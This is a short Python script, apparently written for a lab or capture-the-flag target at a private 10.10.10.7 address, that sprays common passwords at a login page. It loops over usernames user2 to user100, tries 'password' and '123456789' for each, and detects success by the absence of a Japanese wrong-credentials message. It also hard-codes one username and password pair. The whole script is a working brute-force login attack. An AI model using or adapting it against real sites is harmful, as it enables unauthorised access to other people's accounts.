import requests

url = 'http://10.10.10.7/mpk5tdbu/login.php'
cred = {'userID': 'user1', 'password': 'diejuthdkfi14'}
res = requests.post(url, data = cred)
# print(res.status_code)
# print(res.text)
# print(res.text)
# if 'ユーザーIDまたはパスワードが正しくありません' not in res.text:
#     print(cred)

for i in range(2, 101):
    print(i)
    cred = {'userID': 'user' + str(i), 'password': 'password'}
    print('user' + str(i))
    res = requests.post(url, data = cred)
    if 'ユーザーIDまたはパスワードが正しくありません' not in res.text:
        print(cred)
        break
    
    cred = {'userID': 'user' + str(i), 'password': '123456789'}
    res = requests.post(url, data = cred)
    if 'ユーザーIDまたはパスワードが正しくありません' not in res.text:
        print(cred)
        break
